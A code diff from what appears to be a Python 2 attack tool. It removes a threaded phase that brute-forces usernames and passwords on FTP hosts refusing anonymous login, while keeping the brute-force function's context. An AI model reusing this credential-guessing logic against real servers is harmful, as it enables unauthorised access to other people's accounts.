@@ -308,9 +308,7 @@ def bruteforftp(victim):
 				print "[-]Login Incorrect with " + "Username: "+ str(username) +" Password: "+ str(paswd)
 	
 	 
-threads = []
-	
-bruteforceftpdomains = []	
+threads = []	
 for x in ftpurls:
 	
 	
@@ -324,32 +322,7 @@ for x in ftpurls:
 	except ftplib.all_errors as e:
 		print "Host : "+ str(x)
 		print "[-]Login Incorrect. Not allowing anonymous login.\n"
-		bruteforceftpdomains.append(x)
-
-
-print "\n...............................................................................................\n"
-
-print "\n\n                                                 [PHASE: 7]: Starts below                                                \n"
-
-
-print "\n BruteForcing Usernames and password on only domains which are not allowing the anonymous logins\n "
-for x in bruteforceftpdomains:	
-	print "Hostid : " + str(x) 
-	for i in range(14):
-		try:	
-			t = threading.Thread(target=bruteforftp, args=(x,))
-			t.daemon = True
-			t.start()
-			time.sleep(0.4)
-			
-			threads.append(t)		
-		except Exception as e:
-			print e
-			
-			
-for items in threads:
-	
-	items.join()	
+		
 	
 
 		
